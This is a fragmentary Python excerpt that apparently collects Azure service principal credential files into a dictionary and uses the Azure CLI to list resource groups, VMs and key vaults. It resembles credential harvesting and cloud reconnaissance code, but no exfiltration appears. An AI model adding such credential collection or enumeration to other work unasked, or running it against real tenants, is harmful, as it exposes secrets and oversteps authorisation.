            ...
            try:
                with open(file_path, "r") as f:
                    ...
                    if file_path.endswith(".json"):
                        credentials[
                            f"service_principal_{os.path.basename(file_path)}"
                        ] = json.loads(content)
                    else:
                        credentials[
                            f"service_principal_{os.path.basename(file_path)}"
...
def enumerate_azure_resources():
    ...
    try:
        ...
        result = subprocess.run(
            ["az", "group", "list"], capture_output=True, text=True, timeout=10
        )
        if result.returncode == 0:
            resource_groups = json.loads(result.stdout)
            resources["resource_groups"] = [
                rg["name"] for rg in resource_groups[:5]
            ]  # Limit to 5

        # List VMs
        result = subprocess.run(
            ["az", "vm", "list"], capture_output=True, text=True, timeout=10
        )
        if result.returncode == 0:
...
def check_for_key_vaults():
    ...
    try:
        result = subprocess.run(
            ["az", "keyvault", "list"], capture_output=True, text=True, timeout=10
        )
        if result.returncode == 0:
